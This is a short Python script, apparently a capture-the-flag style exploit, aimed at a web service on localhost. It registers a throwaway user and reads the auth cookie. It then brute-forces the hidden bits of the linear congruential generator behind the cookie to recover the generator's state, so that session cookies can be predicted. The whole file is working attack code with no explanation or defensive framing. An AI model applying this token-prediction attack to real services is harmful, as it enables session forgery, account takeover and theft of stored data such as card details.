import requests
import uuid


r = requests.post(f'http://localhost:4040/api/users', json={'login': str(uuid.uuid4()), 'password_hash': str(uuid.uuid4()), 'credit_card_info': 'some card'})

if r.status_code != 201:
    print(r, r.content)
    exit(0)


cookie = r.json()['auth_cookie']

print(cookie)

x1 = int(''.join(reversed(cookie[0:4])), 16)
x2 = int(''.join(reversed(cookie[4:8])), 16)

print(hex(x1), hex(x2))

a = 0x41c64e6d
c = 0x3c6ef35f

low = 0
lows = []
while low < (1 << 16):
    if ((((low | (x1 << 16)) * a + c) & 0xFFFF0000) >> 16) == x2:
        lows.append(low)
    low += 1


for low in lows:
    x = (x1 << 16) | low
    def rand():
        global x
        x = (x * a + c) & 0xFFFFFFFF
        return (x & 0xFFFF0000) >> 16
    b = [x, rand(), rand(), rand(), rand(), rand(), rand(), rand()]
    s = ''
    for l in b:
        s += ''.join(reversed((hex(l)[2:]).zfill(4)))
    print(x, s)

    if s[4:] == cookie.replace('-', ''):
        print('found! current state is ', x, a, c)

